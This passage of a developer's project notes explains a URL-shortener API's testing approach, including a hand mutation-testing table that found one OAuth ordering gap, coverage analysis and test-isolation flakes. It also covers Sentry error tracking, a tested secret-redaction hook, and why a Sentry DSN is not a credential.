**Common pitfalls.** Treating "integration-heavy" as inherently worse than
"unit-heavy" without asking what a unit boundary would actually isolate in
this specific codebase. The pyramid is a heuristic tuned for systems where
business logic is large and infrastructure interaction is small; a thin
API layer over Postgres/Redis/BullMQ is the inverse case, and forcing the
pyramid's shape onto it would mean testing mocks instead of testing risk.

**Production considerations.** The cost this shape actually pays is
runtime and parallelism, not confidence: `fileParallelism: false` makes
the suite serial, wall time was ~30s for 242 tests, and it will keep
growing linearly as the suite grows rather than being parallelizable
across workers the way isolated unit tests would be. That's a real,
worsening cost, and the point at which per-file ephemeral database
sandboxes (rather than one shared instance) become worth their setup
complexity is a "when it starts to hurt" call, not a "do it now" one.

**Interview answer.** My test suite is almost entirely integration tests
against a real Postgres and Redis, not because I skipped unit testing, but
because I mutation-tested it: I deliberately broke 8 real invariants — an
authorization clause, a redirect status code, an idempotency constraint,
a cache invalidation call, a bcrypt comparison, a CSRF check's ordering —
and every one of them lived at the boundary between my code and a real
system. A unit test that mocked that boundary away would have had to mock
away the exact mechanism that made the bug real, so testing at the
integration level wasn't a shortcut here, it was the only level where
these bugs were observable at all.

### Mutation testing by hand and what it revealed

**What it is.** Mutation testing means deliberately introducing a specific
bug into working code, running the test suite, and checking whether it
fails — then reverting. Doing it "by hand" means picking the mutations
deliberately (each one a plausible real regression) rather than using a
mutation-testing framework that generates hundreds of syntactic mutants
automatically. The payoff of the by-hand version is that every result is
inspectable: not just "did the suite fail" but "which specific assertion
failed, and was it the assertion the test was written to make, or an
incidental crash that happened to also turn the suite red."

**Why it exists in this project.** Coverage percentage answers "did any
test execute this line." It cannot answer "would a test actually notice
if this line's logic were wrong," which is the only question that matters
for whether the suite is a real safety net. Eight real invariants were
picked from across the codebase's security- and correctness-critical
paths, applied one at a time on a scratch branch, run against the full
242-test suite, and reverted before the next one — see the table below.

**How it works mechanically.** The full result:

| # | Mutation | Suite failed? | Caught by | Exact vs. incidental |
|---|---|---|---|---|
| 1 | `deleteLink`: drop `AND user_id = $2` | Yes (2 tests) | `linkService.test.ts` non-owner delete test (`expect(deleted).toBe(false)`); `links.test.ts` route-level 404 test | **Exact** — both are the assertion each test was written to make |
| 2 | `updateLink`: drop `AND user_id = ...` | Yes (2 tests) | `linkService.test.ts` non-owner update test (`expect(result).toBeNull()`); `links.test.ts` route-level 404 test | **Exact** |
| 3 | Redirect: `302` → `301` | Yes (12 tests) | `redirect.test.ts` — the dedicated 302 test plus 11 others that assert `status === 302` as a side effect of testing other behavior | **Exact** |
| 4 | Click processor: drop `ON CONFLICT (job_id) DO NOTHING` | Yes (1 test) | `clickProcessor.test.ts` idempotency test | **Incidental** — the 2nd insert throws an uncaught Postgres `23505` unique-violation (`clicks_job_id_unique`) before the intended assertions (`toHaveLength(1)`, `click_count === 1`) ever execute. The suite is only protected here because the DB schema carries its own UNIQUE constraint as a second, independent line of defense — if that constraint didn't exist, this exact application bug would silently double-count clicks and nothing would catch it. |
| 5 | `deadStateError`: check `expiresAt` before `isActive` | Yes (1 test) | `redirect.test.ts` — the pre-sweep/post-sweep message-transition test | **Exact** — and precisely targeted: the pre-sweep assertion in the same test doesn't discriminate (both orderings read "expired" while `isActive` is still true), only the post-sweep assertion does, exactly as the code's own branch structure predicts |
| 6 | `updateLink`: remove `invalidateLinkCache` call | Yes (1 test) | `redirect.test.ts` PATCH-invalidates-cache test (`redis.get(...)` → `toBeNull()`) | **Exact** — caught at the route level only; `linkService.test.ts`'s own `updateLink` tests don't assert Redis state directly, which is fine, not a gap, since the route test covers it |
| 7 | `verifyPassword`: always return `true` | Yes (6 tests) | `passwordService.test.ts` (2 tests) and `redirect.test.ts`/`auth.test.ts`/`authService.test.ts`/`linkService.test.ts` (4 more) | **Exact** — and broader than the mutation's obvious target: `verifyPassword` backs both link-unlock passwords *and* real user login, so this single mutation also broke user authentication, caught directly by `auth.test.ts`'s wrong-password login test |
| 8 | OAuth callback: check `error` before `state` | **No — suite passed clean (242/242)** | — | **Confirmed gap.** No existing test forged a callback with both an invalid/unissued `state` and `error=access_denied` together — the existing tests covered each condition separately (`rejects an unknown state`, `handles denied consent`) but never the combination that actually exercises which one wins. |

**Where it lives in the codebase.** `src/services/linkService.ts`
(mutations 1, 2, 6), `src/routes/redirect.ts` (3, 5),
`worker/processors/clickProcessor.ts` (4), `src/services/passwordService.ts`
(7), `src/routes/auth.ts` (8). The gap-fill test lives in
`tests/routes/googleAuth.test.ts`, right beside the tests it complements —
"rejects an unknown state even when error=access_denied is also present —
state, not error, decides the outcome" — proven to fail against the
mutation (`302` received, `400` expected) before being confirmed to pass
clean against the real code, per this phase's own rule that every new test
must be shown capable of failing.

**Common pitfalls.** Two, both surfaced directly by this exercise:

- Applying a mutation naively can produce a *different* bug than intended.
  The first attempt at mutation 1 just deleted the `AND user_id = $2` SQL
  text but left the now-stale `userId` value in the query's parameter
  array — Postgres's bind protocol strictly checks parameter count against
  placeholder count, so this threw `bind message supplies 2 parameters,
  but prepared statement "" requires 1` before the authorization logic was
  ever exercised. That's a real catch, but not evidence the authorization
  test works — it's evidence pg's driver validates parameter counts. The
  mutation had to also drop the unused parameter to faithfully simulate
  "the authorization check silently vanished" rather than "the query
  became malformed."
- A mutation "being caught" is not the same claim as "being caught for the
  right reason." Mutation 4 is the concrete example: the suite goes red,
  satisfying the letter of the exercise, but the assertion that actually
  fires is a database-level uniqueness violation, not the click-count
  assertion the test's own name promises to verify. A future refactor that
  wrapped that insert in a broader try/catch (for an unrelated reason)
  would silently remove this protection while the test file looked
  unchanged — the test would still exist, still be named the same thing,
  and would no longer catch the bug it claims to.

**Production considerations.** The one confirmed gap (mutation 8) was a
CSRF-adjacent ordering bug in the OAuth callback — exactly the class of
bug that's cheap to introduce during an innocent-looking refactor (moving
a block up a few lines to "handle errors first") and expensive to notice
in production, since a forged callback exploiting it wouldn't error
visibly, it would just quietly redirect as if consent had been denied.
This is the argument for doing this exercise periodically rather than
once: the code that's correct today can regress silently, and only a test
that specifically pins the ordering would notice.

**Interview answer.** I ran mutation testing by hand on this API: I
introduced 8 specific, plausible bugs — one at a time, on a scratch
branch, reverted after each — covering authorization, HTTP correctness,
idempotency, cache invalidation, password verification, and CSRF
protection, and recorded exactly which assertion caught each one. Seven
were caught by the assertion they were designed to catch; one was only
caught incidentally by a database constraint rather than the test's own
logic, which told me that specific safety net is more fragile than its
green checkmark suggests; and one — a reordering of an error-vs-state
check in an OAuth callback — passed the suite completely clean, which is
exactly the kind of gap that a coverage percentage would never have
surfaced, since every line involved was already "covered."

### Coverage as a map, not a target

**What it is.** `npm run test:coverage` (added this phase via
`@vitest/coverage-v8` — vitest 3's native provider, chosen over
`@vitest/coverage-istanbul` because it needs no separate source-
instrumentation pass and is precise enough for a number this phase treats
as diagnostic, not a threshold to hit; istanbul's finer branch remapping
buys nothing here) reports **76.89% statement coverage** overall.

**Why it exists in this project.** That number is close to meaningless on
its own, and the per-file breakdown proves why: `worker/index.ts`,
`worker/shutdown.ts`, and `src/server.ts` show 0%, not because they're
untested but because they're process entrypoints. `worker/index.ts` and
its SIGTERM handling in `worker/shutdown.ts` genuinely are exercised —
`tests/worker/clickQueue.integration.test.ts` spawns the real worker as a
child process and asserts on its stdout and exit code — but v8's coverage
instrumentation only sees the vitest process itself, so a real, working
test produces a permanent, correct-looking zero. `scripts/seed.ts` and
`scripts/bench/*` are 0% because they're operator-run scripts never
imported by the app or the test suite, not because anything is broken.
Averaging those zeros into "76.89%" makes the number look worse than the
actual tested surface and tells you nothing about where the risk is.

**How it works mechanically.** The useful signal is in the per-file table,
read selectively:

- `src/services/authService.ts` (82.3%) is missing lines 206-233: the
  branch that handles two concurrent Google logins for the same account
  racing on a Postgres unique-violation. This is real, security-adjacent
  concurrency-handling code, genuinely hard to hit without deliberately
  forcing the race (e.g., mocking `query` to reject once with a `23505`
  error, the same technique `linkService.test.ts` already uses to force
  `createLink`'s alias-collision retry path).
- `src/services/linkService.ts` (93.9%) is missing the negative-cache
  *read* path (lines 391-393) — the branch that serves a cached "this
  short code doesn't exist" sentinel. The cache's *write* side is
  exercised elsewhere; the read side specific to this file currently
  isn't, meaning a break in negative-cache deserialization wouldn't be
  caught here.
- `src/routes/redirect.ts` (97.36%) is missing lines 168-170: POST
  `/:shortCode/unlock` called on a link that isn't password-protected.
  Low-risk (a three-line redirect), but genuinely never asserted.
- `src/routes/auth.ts` (97.1%) is missing lines 119-120: a valid JWT for a
  user account that no longer exists. Untested because there's currently
  no delete-user code path to construct that state with — this is a
  testability gap that traces back to a missing feature, not a missing
  test.
- `src/middleware/notFoundHandler.ts` (50%, 0% functions) is entirely
  unexercised — no test has ever hit a genuinely undefined route. Cheap to
  add, simply hasn't been.
- By contrast, `src/services/linkService.ts` lines 435-439 (a Redis SET
  failure while writing the negative cache) and `rateLimit.ts` line 95 (a
  `Retry-After` header defensively defaulting when express-rate-limit
  didn't set one) are the low-value kind: narrow defensive branches
  structurally identical to sibling branches (`redirect.test.ts`'s "falls
  back gracefully when Redis SET fails") that are already proven tested,
  just not this exact narrow combination of them.

**Where it lives in the codebase.** `vitest.config.ts`'s new `coverage`
block (`provider: 'v8'`, `text` + `html` reporters); run via the new
`npm run test:coverage` script.

**Common pitfalls.** Chasing the percentage up by testing whatever's
cheapest to cover (usually more happy-path assertions on already-tested
code) rather than reading the uncovered-lines list and asking which ones
are actually load-bearing. The 0%-coverage entrypoint files are the sharpest
version of this trap: instrumenting them "properly" would require running
coverage collection across a spawned child process, real infrastructure
work with no corresponding increase in actual risk covered — chasing that
number up would be pure theater.

**Production considerations.** A coverage threshold gate in CI (there
isn't one currently — this repo has no CI config at all) would be actively
harmful here without carving out the entrypoint/script files first, since
it would either block on unfixable structural zeros or get disabled/raised
by whoever hits it, either of which is worse than not having the gate.

**Interview answer.** I added coverage tooling this phase, and the
headline number — 76.89% — is the least interesting thing it produced.
Most of the gap is structural: worker and server entrypoints that a
separate-process integration test genuinely exercises but that in-process
instrumentation can't see, and operator scripts nothing imports. The
useful output was the per-file uncovered-line list, which surfaced a real
concurrent-signup race branch worth testing with a forced-collision mock,
and confirmed that most of what's "missing" is either structurally
invisible to the tool or a defensive branch identical in kind to ones
already proven tested elsewhere.

### Test isolation and the shared-state trap

**What it is.** Most of this suite's files share one real Postgres
database and one real Redis instance rather than each getting an isolated
sandbox. That's a deliberate cost tradeoff (see above), but it means one
file's side effects can, in principle, leak into another's — Phase 10
already hit this once, when shared Redis-backed rate-limit state let one
test file's supertest requests exhaust budget a later file's requests then
inherited, fixed by having `auth.test.ts`, `links.test.ts`,
`googleAuth.test.ts`, and `redirect.test.ts` each flush their own
`rl:auth-*` keys in a file-local `beforeAll`.

**Why it exists in this project.** This phase re-ran that check: `npm
test` twice back-to-back, then five times with `--sequence.shuffle.files`
at fixed seeds. Three distinct findings came out of it, none of them the
already-fixed rate-limit issue recurring:

1. The plain back-to-back run actually failed once, in
   `tests/scripts/seedBulk.test.ts`'s "produces the expected row-count
   range, a skewed click distribution, and a sweep-target row" test — but
   this is **not** cross-file contamination. It's a self-contained
   statistical flake: at the test's `SCALE=0.002` (100 seeded links), only
   a 3%-per-link roll produces an "expired but still active" row, so the
   expected count is ~3 but has a real, non-negligible (~5%,
   `0.97^100 ≈ e^-3`) chance of landing at exactly 0 in any given run. Two
   consecutive runs (fail, then pass) is consistent with that math, not
   with any state leaking between files.
2. Shuffling file order at 5 different seeds never actually broke on the
   dependency `vitest.config.ts`'s own comment names — `migrations.test.ts`
   dropping and recreating tables `constraints.test.ts` depends on. 4 of
   the 5 shuffled seeds ran `constraints.test.ts` *before*
   `migrations.test.ts` (the "wrong" order per that comment) and all 4
   passed clean regardless. That doesn't mean the comment is wrong — it
   may describe a narrower failure window this particular set of seeds
   didn't land in — but it's worth noting the empirical behavior didn't
   match the documented severity in this sample, rather than either
   removing the safeguard or treating it as unconfirmed.
3. One shuffle (seed 1) produced a genuine, new cross-file failure:
   `tests/routes/googleAuth.test.ts`'s "issues a different state on each
   call" test threw `TypeError: Invalid URL` because `GET /api/auth/google`
   returned a response with no `Location` header — consistent with
   `storeState`'s Redis write failing inside the route handler. In that
   shuffle order, this test ran immediately after
   `tests/worker/clickQueue.integration.test.ts`, which spawns a real,
   separate worker OS process against the *same* shared Redis instance and
   only `SIGTERM`s it at the end of its own test. Re-running the identical
   seed immediately after passed clean — so this is a timing-sensitive
   race tied to that spawned process's teardown, not a deterministic
   ordering bug, and it reproduced once in roughly six full-suite runs
   during this phase.

**How it works mechanically.** `fileParallelism: false` (existing) forces
files to run one at a time within the vitest process, which is what makes
the rate-limit and migrations/constraints risks tractable at all — but it
says nothing about a real external OS process (finding 3) that
`fileParallelism` has no authority over, since it's not a vitest file at
all.

**Where it lives in the codebase.** `tests/scripts/seedBulk.test.ts` line
77 (finding 1); `vitest.config.ts`'s `fileParallelism` comment and
`tests/db/migrations.test.ts`/`constraints.test.ts` (finding 2);
`tests/worker/clickQueue.integration.test.ts` (finding 3, the spawned
child process).

**Common pitfalls.** Treating "the suite passed when I reran it" as
resolution rather than as more data. All three findings here were only
visible *because* the suite was run more than once, in more than one
order — a single green `npm test` run proves nothing about either the ~5%
flake or the rare cross-process race.

**Production considerations.** None of these three findings were fixed in
this phase — findings 1 and 3 are both probabilistic rather than
deterministic, and CLAUDE.md's instruction to name a fix rather than
implement it applies squarely here: (1) could be seeded with a fixed PRNG
or asserted with `toBeGreaterThanOrEqual(0)` plus a documented rationale
instead of `toBeGreaterThan(0)`, and (3) would need either a private Redis
logical DB for the spawned worker, or an explicit settle delay after
`child.kill('SIGTERM')` resolves, before the next file is allowed to
start. Finding 2 needs no fix — it's a discrepancy between documented and
observed risk, not a bug, worth a comment update at most.

**Interview answer.** I don't trust a single green test run to mean the
suite is actually isolated — I ran it twice back-to-back and five times
shuffled at fixed seeds specifically to try to break that assumption. It
surfaced three different things: a real ~5% statistical flake in one
probabilistic test, an interesting non-finding (a documented file-ordering
risk that didn't actually reproduce across several shuffles), and a
genuine, if rare, cross-process race caused by a test that spawns a real
worker against the same shared Redis the rest of the suite uses. None of
them were the already-known rate-limit leak recurring — which is itself
useful confirmation that that specific fix is holding.

### What deserves tests here, and what doesn't

**What it is.** Not every line of this codebase is worth the same testing
investment. Authorization boundaries, HTTP-visible correctness, and
consistency-under-failure paths are worth deliberate, named tests.
Framework-guaranteed behavior and truly unreachable branches aren't.

**Why it exists in this project.** The coverage-theater audit in this
phase (grepping every test file for `toHaveBeenCalled()`-only assertions,
`not.toThrow()`, bare `toBeDefined()`/`toBeTruthy()`, and status-only
checks, then reading every match's full test block, not just the matched
line) found **no genuine coverage theater** — every borderline pattern
turned out to be a deliberately narrow, meaningful assertion for its
specific purpose: `not.toThrow()` on `assertSafeToRun` is the entire
correct contract for a guard function; `resolves.toBeDefined()` on a
constraint test is paired with, and only meaningful next to, its sibling
`.rejects.toMatchObject({code: '23514'})` tests; `toBeDefined()` on a
health-check response proves the redirect router isn't shadowing the real
route, which is the one narrow thing that test exists to prove. None were
strengthened or deleted, because none needed to be.

**How it works mechanically.** The signal that *does* separate
high-value from low-value tests in this codebase isn't a lint pattern, it's
what this phase's mutation table already answered directly: every
mutation that lived at a security or correctness boundary (ownership
checks, password verification, CSRF ordering) was caught by an assertion
written specifically for that boundary. The coverage map's uncovered
lines split the same way — a real concurrent-signup race (worth testing)
versus a Redis-outage branch identical in kind to three already-tested
siblings (not worth another copy).

**Where it lives in the codebase.** The full coverage-theater grep and
read covered all 25 files under `tests/`; the borderline cases named
above live in `tests/scripts/seedBulk.test.ts`, `tests/db/constraints.test.ts`,
and `tests/routes/redirect.test.ts`.

**Common pitfalls.** Confusing "assertion count" with "assertion value" —
a test with five `expect()` calls that all check the same fact five
different ways is worth less than one test with a single `expect()` that
checks the fact a mutation would actually break. This phase's mutation
table is a more honest measure of value than either coverage percentage
or assertion count.

**Production considerations.** The discipline that keeps this suite free
of theater is visible in its own conventions: nearly every test that
mutates state also re-queries the database directly to confirm the row
actually changed (or didn't), rather than trusting the HTTP response
alone. That's the pattern worth protecting as the suite grows — a new
contributor copying an existing test file by example will copy this habit
along with it, for free.

**Interview answer.** I audited this suite specifically for coverage
theater — tests that assert a mock was called or that nothing threw,
without checking the actual outcome — and found none. What that told me
is less about this suite's cleverness and more about a checkable habit:
almost every state-mutating test re-reads the database directly to
confirm what actually happened, instead of trusting the response body.
That habit is what makes the difference between a test that looks
thorough and one that actually is.

### Why authorization tests are the highest-value tests here

**What it is.** Of the 8 mutations exercised this phase, 3 were direct
authorization or identity-boundary bypasses: mutation 1 (any user can
delete any other user's link), mutation 2 (any user can edit any other
user's link), and mutation 8 (a forged OAuth callback can be accepted
without ever proving it originated from a request this server issued).

**Why it exists in this project.** These are qualitatively different from
the other 5 mutations. A wrong redirect status code (mutation 3) degrades
UX. A missed cache invalidation (mutation 6) causes stale data for a
bounded window. A duplicate click (mutation 4, in its incidental-catch
form) skews an analytics number. All of those are real bugs, but they're
contained — they affect correctness within the boundary of "the request
this app is legitimately handling." An authorization bypass doesn't stay
contained: mutation 1 or 2, left unpatched, would mean *the isolation
between users this entire API's data model depends on* simply doesn't
exist, silently, for every user, all the time — not a degraded experience
but a completely different (and false) security posture than the one the
schema and route layer both claim to provide. Mutation 8's one confirmed
gap is the sharpest version of this: unlike 1 and 2, which were already
directly tested and caught instantly, mutation 8 slipped through with
*zero* suite signal — the exact failure mode an authorization test
exists to prevent.

**How it works mechanically.** The pattern that makes mutations 1 and 2's
tests effective isn't clever — it's structural. Both
`tests/services/linkService.test.ts` and `tests/routes/links.test.ts`
don't just call the function/route as a non-owner and check the response;
they re-query Postgres directly afterward to confirm the row is
byte-for-byte unchanged. That's what makes those two mutations get caught
by the *intended* assertion rather than incidentally: the test doesn't
just check "did I get denied," it checks "did the denial actually prevent
the write," which is the only version of the assertion that can't be
fooled by, say, a handler that returns 404 but still executes the query.

**Where it lives in the codebase.** `tests/services/linkService.test.ts`
("returns null/false and leaves the row untouched when attempted by a
non-owner", both `updateLink` and `deleteLink`); `tests/routes/links.test.ts`
("object-level authorization: user B against user A's link"); the new
`tests/routes/googleAuth.test.ts` test from this phase's gap-fill.

**Common pitfalls.** Writing an authorization test that only checks the
HTTP status code. A 404 or 401 response proves the *caller* didn't see
the data — it doesn't prove the *write* didn't happen, if the bug is in
which rows a mutation targets rather than which rows a read returns. The
re-query-the-database pattern this suite already uses is the fix, and
it's the reason mutations 1 and 2 were both caught cleanly while mutation
8 — which had no equivalent "prove the bypass didn't have an effect" test
for the *combination* of conditions that actually mattered — was not.

**Production considerations.** Authorization tests are also the tests
most worth re-running under mutation testing specifically, on a recurring
basis, rather than trusting a green suite to mean the boundary still
holds — because as mutation 8 showed, the individual conditions
(`rejects an unknown state`, `handles denied consent`) can each be
perfectly tested in isolation while the *combination and ordering* that
actually defines the security property goes completely unverified,
invisible to a coverage tool since every line involved is "covered" by
some test or other.

**Interview answer.** If I only had time to test one class of thing in an
API like this, it would be authorization boundaries — not because other
bugs don't matter, but because their blast radius is different in kind,
not just degree. A wrong status code degrades one request; a broken
ownership check breaks the security model for every user, silently, until
someone notices. This phase's mutation table backs that up directly: the
two ownership-check mutations were caught instantly by tests that
re-verify database state, not just response codes, while the one bug that
slipped through completely undetected was also, not coincidentally, the
one authorization-adjacent check whose *combination* of conditions had no
dedicated test — proof that the coverage that matters most here is
coverage of the boundary, not coverage of the line count.

## Phase 14a: Observability & API Documentation

### The three observability pillars, and what this phase does and doesn't cover

**What it is.** "Observability" is usually broken into three pillars:
logs (discrete, structured events), metrics (numeric aggregates over
time — counts, gauges, histograms), and traces (the causal path a single
request takes across services/processes). This phase touches all three
in a small way — Sentry for error-shaped events, a route-pattern log
field for latency aggregation, and BullMQ queue depth as a health-check
gauge — without building a real instance of any of them.

**Why it exists in this project.** A phase like this is where it's
easiest to overclaim. The honest scope is: error tracking (Sentry) is
real and production-grade as far as it goes. The "metrics" here are a
log field plus a script that greps a file — not a metrics backend.
There is no tracing at all: a click enqueued on the redirect path and
processed later by the worker has no span connecting those two log
lines beyond a shared `linkId`/`clickId` a human has to cross-reference
by hand.

**How it works mechanically.** Logs: Pino, unchanged from Phase 3,
extended with a `route` field (see "Route-pattern aggregation"
below). Metrics: `scripts/log-percentiles.ts` reads NDJSON log lines
off disk/stdin and computes percentiles in-process — there's no
scrape endpoint, no persistence, no alerting. Traces: none — Sentry's
`tracesSampleRate` is explicitly `0` (see "Error tracking vs.
structured logging" below), so even the one library in this phase that
*could* produce spans is configured not to.

**Where it lives in the codebase.** `src/lib/sentry.ts` /
`worker/lib/sentry.ts` (error tracking), `src/middleware/requestContext.ts`
(the `route` field), `scripts/log-percentiles.ts` (the percentile
script), `src/services/health.ts` (queue depth as a gauge, read
on-demand rather than pushed anywhere).

**Common pitfalls.** Treating "we added Sentry" as "we have
observability." Error tracking answers "what broke and how often" for
things that already throw; it says nothing about a redirect that
succeeds but takes 800ms, or a slow degradation in queue depth that
never crosses the health check's threshold. Those need the logging and
health-check pieces respectively — which is exactly why this phase
built both, not just the first one.

**Production considerations.** At real traffic, the two gaps above stop
being academic: log-file percentiles don't survive a log rotation or a
multi-instance deployment (each instance's log file only sees its own
slice of traffic), and "no tracing" means a slow click stops being
debuggable past "the redirect enqueued it" — nothing connects that log
line to the specific worker invocation that processed it later. See
"What this phase's logging setup is not" below for what a real
deployment reaches for instead.

**Interview answer.** Observability isn't one tool, it's three
complementary signal types — logs, metrics, traces — and it's easy to
add one (usually error tracking, because it's the easiest to demo) and
call the box checked. This phase deliberately built a small, honest
version of all three specifically so the gaps would be visible and
nameable, rather than quietly missing.

### Error tracking vs. structured logging

**What it is.** Pino logging (Phase 3) and Sentry (this phase) look
similar — both capture an error object — but answer different
questions. Logging answers "what happened, in order, for this specific
request," and is designed to be read sequentially or grepped. Error
tracking answers "which distinct failures are happening, how often,
and are they new" — it deduplicates by stack trace/fingerprint and is
designed to be triaged, not read top-to-bottom.

**Why it exists in this project.** Without Sentry, a spike in a
specific 500 is only visible by someone actively tailing or querying
logs. Sentry turns that into a thing that pages/notifies on its own,
grouped by the actual failure rather than by request. That's a
genuinely different job from logging, not a nicer UI for the same job.

**How it works mechanically.** Sentry is wired into exactly three
places, deliberately not as request middleware:
1. `src/middleware/errorHandler.ts`'s existing `statusCode >= 500`
   branch — the same branch that already does `log.error` — calls
   `Sentry.captureException`, tagged with `requestId`, `statusCode`,
   and `isOperational`. 4xx responses are `log.warn`'d as before and
   never reach Sentry: they're expected client errors (bad input,
   wrong password, expired link), not incidents.
2. `worker/index.ts`'s existing `worker.on('failed', ...)` listener
   (already logging job failures) additionally calls
   `Sentry.captureException`, tagged with which worker and job ID.
3. Sentry's own default `onUncaughtException`/`onUnhandledRejection`
   integrations, enabled automatically by `Sentry.init()` — nothing
   hand-rolled for this; Node's default crash-on-uncaught-exception
   behavior is preserved, Sentry just gets to see it first.

`Sentry.init()` itself is guarded on `SENTRY_DSN` being set
(`src/lib/sentry.ts`, `worker/lib/sentry.ts`) — unset, it logs one line
and every `Sentry.*` call elsewhere becomes a safe no-op, so local dev
never needs a real Sentry project. `tracesSampleRate: 0` turns off
performance/span instrumentation entirely, and no Sentry Express
middleware (`Sentry.setupExpressErrorHandler` or similar) is
registered — see "The redirect hot path" below for why, and what
that's worth in practice.

**Where it lives in the codebase.** `src/lib/sentry.ts`,
`src/lib/sentryScrub.ts`, `src/instrumentation.ts` (server),
`worker/lib/sentry.ts`, `worker/instrumentation.ts` (worker),
`src/middleware/errorHandler.ts` and `worker/index.ts` (the two capture
call sites). `src/instrumentation.ts` / `worker/instrumentation.ts` are
imported first, before anything else, in `src/server.ts` /
`worker/index.ts` — Node ESM evaluates static imports in declaration
order, so this guarantees `Sentry.init()` runs before any route or job
handler exists to throw. `src/app.ts` never imports either
instrumentation module, so the supertest-based test suite (which
imports `app` directly) never triggers `Sentry.init()` as a side
effect.

**Common pitfalls.** Wiring error tracking through a generic Express
error-handling middleware layered *on top of* an app's own error
handler, duplicating the 5xx/4xx distinction that already exists.
Capturing every error indiscriminately (4xx included) is the other
common mistake — it turns Sentry into a firehose of expected outcomes
(wrong passwords, expired links, validation failures) and trains
whoever's on call to ignore it.

**Production considerations.** At scale, this setup would want sampling
(`sampleRate` < 1 on very high-volume error types) and release tracking
(tagging events with a deploy version, so a regression is visible as
"started at deploy X") — neither is in scope here; both slot into the
same `Sentry.init()` call without restructuring anything.

**Interview answer.** Logging and error tracking look redundant because
they both touch the same exception object, but they're solving
different problems — one is a sequential record, the other is
deduplicated triage. I wired Sentry into the exact two places this app
already distinguishes real incidents from expected errors (the
error handler's 5xx branch, the worker's job-failure listener) instead
of adding a parallel error-handling layer, so the two systems agree
about what counts as "server error" by construction, not by convention.

### Scrubbing before it leaves the process, and proving it

**What it is.** A `beforeSend` hook (`src/lib/sentryScrub.ts`) that
Sentry runs on every event immediately before transmitting it, given
the chance to redact or drop the event entirely.

**Why it exists in this project.** Error events are unusually likely to
carry exactly the data that must never leave this process: the request
that crashed a handler often has the full request body, headers, and
cookies attached (Sentry captures these by default), and this app
specifically handles JWTs (`Authorization` headers), OAuth codes (the
`/api/auth/google/callback` query string), passwords (signup, login,
and link-unlock bodies), and signed unlock cookies. None of those
should be readable in a third-party-hosted dashboard.

**How it works mechanically.** `scrubSentryEvent` redacts by key name
(`authorization`, `cookie`, `set-cookie`, `password`, `token`, `jwt`,
case-insensitive) recursively through `request.headers`,
`request.data`, `event.extra`, and `event.contexts` — and handles two
things that don't fit that pattern: `request.cookies` is blanket-redacted
regardless of key name (every entry in a parsed Cookie header is a
cookie value by construction — this app's own
`link_unlock_<shortCode>` cookie has an app-specific name no denylist
would know in advance), and `request.query_string` is parsed with
`URLSearchParams` specifically to delete the OAuth `code` parameter,
since Sentry stores it as a raw string, not a parsed object, and the
sensitive thing there is a value keyed by an entirely unremarkable name
("code"). The function returns a new object; nothing is mutated in
place.

**Where it lives in the codebase.** `src/lib/sentryScrub.ts`, shared
verbatim between the API and worker processes (`worker/lib/sentry.ts`
imports it directly across the `src/`/`worker/` boundary — the same
established pattern `worker/config.ts` already uses for
`envSchema`/`contracts.ts`; `worker/tsconfig.json`'s `include` list was
extended with this one file for exactly that reason).
`tests/lib/sentryScrub.test.ts` is the proof, not the docstring above:
it builds a fake event containing an `Authorization` header, a
`Cookie` header, `request.cookies`, a `password` and `token` field in
the body, a `jwt` field in `extra`, and a query string with a `code`
param — then asserts each one is actually gone from the scrubbed
output, while a deliberately-included benign field (`user-agent`,
`email`) survives untouched. Asserting the hook is *registered* would
have caught a wiring mistake; asserting the hook *works* is what
catches a subtly wrong redaction (this exact project caught one during
development — see "Common pitfalls" below).

**Common pitfalls.** The first version of this scrub redacted
`request.cookies` the same key-matching way as headers — which is
wrong, because a cookie's *key* is an application-specific name
(`link_unlock_abc123`), not a recognizable word like "cookie." The
test caught this immediately (`expected 'some-signed-token' to be
'[REDACTED]'`) precisely because it asserted the actual redacted
*value*, not just that `beforeSend` ran. That's the general lesson:
a scrub test that only checks "the hook fired" or "the function didn't
throw" would have passed on the broken version.

**Production considerations.** This denylist is necessarily incomplete
— any future field with a sensitive value and an unrecognizable key
(a new "reset code," an API key issued to a third party) needs either a
new denylist entry or, more robustly, a shift toward an allowlist
("only these fields ever leave the process") as the surface grows.

**Interview answer.** The easy version of this feature is a
`beforeSend` hook that looks right; the hard version is proving it. I
wrote a test that builds a fake Sentry event with every category of
secret this app handles — JWTs, passwords, an OAuth code, a signed
cookie — and asserts each one is actually redacted in the output, not
just that the hook exists. That test caught a real bug during
development: my first pass redacted cookies by matching the key name
"cookie," which does nothing for a cookie whose actual name is
`link_unlock_abc123`. Testing the claim, not the wiring, is what
caught it.

### SENTRY_DSN: a public identifier, not a secret

**What it is.** A Sentry DSN (`https://<key>@<org>.ingest.sentry.io/<project>`)
looks exactly like a credential — it's a URL with what reads as an API
key embedded in it — but it functions as a write-only mailing address,
not an access token.

**Why it exists in this project.** It matters here because
`SENTRY_DSN` is defined in `src/config/env.ts` right alongside genuine
secrets (`JWT_SECRET`, `GOOGLE_CLIENT_SECRET`) that must never be
exposed, and because a future browser-side Sentry integration (Phase
14b, out of scope here) would need this same value shipped inside a
public frontend bundle — which would be a serious mistake if it were
actually a credential.

**How it works mechanically.** The DSN only tells Sentry's client SDK
*where* to send events; it grants no read access to any project data,
no way to query past events, and no way to change project settings —
those all require a separate, genuinely secret API token that this app
never touches. Sentry's own SDKs are designed and documented to be
embedded in shipped client code (browser bundles, mobile apps) for
exactly this reason. If a DSN leaks, the only thing a third party can
do with it is send Sentry *more* events under this project — an
availability nuisance (rate-limit/quota noise), not a data breach.

**Where it lives in the codebase.** `src/config/env.ts`
(`SENTRY_DSN: z.string().url().optional()`), `.env.example`. Optional,
no default — unlike `JWT_SECRET`, an unset `SENTRY_DSN` is a completely
fine, common state (local dev), not a startup-blocking misconfiguration.

**Common pitfalls.** Treating it like every other `*_SECRET`/`*_KEY`
env var reflexively — e.g., refusing to let a build tool inline it into
a client bundle, or being surprised it isn't in a secrets manager
alongside `JWT_SECRET`. The comment on the `SENTRY_DSN` field in
`src/config/env.ts` calls this out explicitly for exactly that reason.

**Production considerations.** The one thing worth actually gatekeeping
around a DSN, even though it isn't a credential: Sentry-side quota and
alert-noise limits, since anyone holding it can generate billable
events. That's a usage-management concern, not a confidentiality one.

**Interview answer.** A Sentry DSN reads as a secret — it's a URL with
what looks like an embedded key — but it's actually a write-only
address: it tells the SDK where to send events and grants no read
access to anything. That's exactly why Sentry's own client SDKs ship
DSNs inside public browser bundles by design. I still keep it in the
same env schema as real secrets, because that's where config belongs,
but I don't treat it with the same handling requirements — the
comment in the schema says so explicitly, so the next person touching
this doesn't have to rediscover it.

